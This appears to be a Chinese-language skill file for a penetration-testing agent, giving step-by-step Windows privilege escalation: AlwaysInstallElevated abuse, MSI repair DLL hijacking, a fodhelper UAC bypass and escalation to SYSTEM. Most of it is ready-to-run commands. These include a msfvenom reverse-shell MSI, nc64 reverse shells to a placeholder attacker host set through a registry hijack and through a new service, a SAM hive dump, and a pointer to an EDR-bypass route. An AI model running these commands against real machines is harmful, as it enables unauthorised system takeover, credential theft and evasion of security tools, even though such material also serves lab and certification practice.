# AlwaysInstallElevated / MSI / UAC 边界

> **TECH：** 安装程序策略与 UAC 完整性边界  
> **IMPACT：** High IL 本地管理员，或 MSI 直接 SYSTEM  
> **成功：** High IL `whoami /groups` 含 Administrators 且能执行命令；MSI 路径要 SYSTEM/admin 命令执行  
> **不是成功：** Medium IL 弹了 UAC 提示；fodhelper 在非管理员用户上无声失败

---

## 1. 先判断完整性，不要盲打 UAC

```cmd
whoami /groups
```

```text
Mandatory Label\High Mandatory Level     → 已过 UAC，去 Potato/服务/token
Mandatory Label\Medium + Administrators  → 本文件 UAC 绕过
Mandatory Label\Medium，无 Administrators → UAC 绕过无效，离开本文件
```

```powershell
$p = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
whoami /groups | findstr /i "Mandatory Level"
```

UAC 绕过 = Medium → High。**不是 SYSTEM。** High 之后回到 SKILL 决策树继续拿 SYSTEM。

---

## 2. AlwaysInstallElevated（MSI → SYSTEM）

两个键都是 `0x1` 才可打：

```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f msi -o evil.msi
```

```cmd
msiexec /quiet /qn /i C:\Users\Public\evil.msi
```

成功：SYSTEM 回连。不要用 `net user /add` 当终点。

### GATES

任一键缺失或为 0 → 不可用。企业很少开，HTB/OSCP 常见。

### RESTORE

```cmd
msiexec /qn /x C:\Users\Public\evil.msi
del C:\Users\Public\evil.msi
```

产品码未知时至少删 msi、记下回连进程。

---

## 3. MSI 修复 / 可写修复路径

有的已装 MSI 以 SYSTEM 做 repair，并加载可写目录里的 DLL（`msiexec /fa`）。

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products /s | findstr /i "DisplayName"
```

PrivescCheck 的 `ModifiableReferencedPath` / MSI 相关检查优先。确认 repair 以 SYSTEM 跑且路径可写后再放 DLL。没有这条证据不要对随机产品执行 `/fa`。

RESTORE：删 DLL，必要时再 repair 一次恢复。

---

## 4. UAC 绕过（仅管理员组 + Medium IL）

目标：无弹窗把当前 token 升到 High。下面三条仍然短、常见。不要堆 30 个名字。

### fodhelper / computerdefaults（HKCU ms-settings）

```cmd
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "C:\Users\Public\nc64.exe KALI 4444 -e cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /d "" /f
fodhelper.exe
:: 或 computerdefaults.exe
```

成功：High IL shell。然后 GodPotato/服务/本机管理员能力继续打 SYSTEM。

RESTORE：

```cmd
reg delete "HKCU\Software\Classes\ms-settings" /f
```

### ICMLuaUtil（ColorDataProxy / CMSTPLUA COM）

公开实现如 `UACBypassCMSTPLUA` / various IFileOperation 变体。只在 fodhelper 被拦时用。按当前工具 README 指定要执行的命令。

被 Defender 拦 → `/edr-bypass` 回来再升 High。

### 明确不要

```text
eventvwr / sdclt 老路径在新 Win10/11 经常失效，不当默认
非管理员用户执行 fodhelper — 会启动应用但权限不变
把 UAC 绕过写成 SYSTEM
autoElevate 清单不等于可绕过；还要当前用户在管理员组
```

---

## 5. 从 High 继续到 SYSTEM

High 本地管理员通常已经能：

```cmd
sc query
reg save HKLM\SAM C:\Users\Public\sam
.\GodPotato.exe -cmd "cmd /c whoami"
```

有 SeImpersonate（管理员默认有）→ Potato。  
没有 → 装服务 / 计划任务 SYSTEM / `psexec -s`。

```cmd
sc create Xcmd binpath= "C:\Users\Public\nc64.exe KALI 4444 -e cmd.exe" start= demand obj= LocalSystem
sc start Xcmd
```

RESTORE：`sc stop Xcmd & sc delete Xcmd`

这仍算 `/privesc-win` 链（High → SYSTEM），不要因为已经是管理员就切 `/post`。
